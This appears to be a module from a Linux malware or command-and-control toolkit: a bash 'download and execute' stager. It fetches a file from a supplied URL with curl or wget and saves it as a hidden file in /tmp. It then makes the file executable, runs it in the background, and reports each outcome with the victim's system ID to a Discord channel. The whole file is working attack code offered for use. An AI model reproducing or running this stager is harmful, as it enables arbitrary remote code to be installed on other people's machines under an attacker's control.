#!/bin/bash
# ============================================================
# Download & Execute for Linux - Modular Remote Payload
# ============================================================
# Requires: $U (URL to download)
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$U" ]]; then
    send_discord "❌ Download failed on $SYSID - No URL provided"
    exit 1
fi

PAYLOAD_PATH="/tmp/.payload_$(date +%s)"

# Download
if command -v curl &>/dev/null; then
    curl -sL "$U" -o "$PAYLOAD_PATH"
elif command -v wget &>/dev/null; then
    wget -q "$U" -O "$PAYLOAD_PATH"
else
    send_discord "❌ No curl or wget available on $SYSID"
    exit 1
fi

# Check if download succeeded
if [[ ! -f "$PAYLOAD_PATH" ]]; then
    send_discord "❌ Download failed on $SYSID"
    exit 1
fi

# Make executable and run
chmod +x "$PAYLOAD_PATH"
"$PAYLOAD_PATH" &

send_discord "✅ **Payload Executed on $SYSID**\nURL: $U"

